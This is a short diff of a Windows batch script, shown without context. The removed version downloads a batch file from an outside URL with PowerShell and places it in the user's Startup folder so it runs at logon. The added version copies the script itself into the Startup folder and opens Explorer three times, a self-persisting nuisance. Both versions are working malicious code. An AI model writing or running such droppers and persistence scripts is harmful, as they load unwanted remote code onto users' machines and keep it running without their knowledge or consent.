@@ -1,11 +1,9 @@
 @echo off
-setlocal
+set AUTOSTART=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+copy "%~f0" "%AUTOSTART%\%~nx0"
 
-set "url=https://kappa.lol/e6jmfg"
-set "dest=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test2.bat"
+start explorer
+start explorer
+start explorer
 
-set "tempfile=%TEMP%\downloaded_file.bat"
-
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile%')"
-
-move /Y "%tempfile%" "%dest%"
+exit
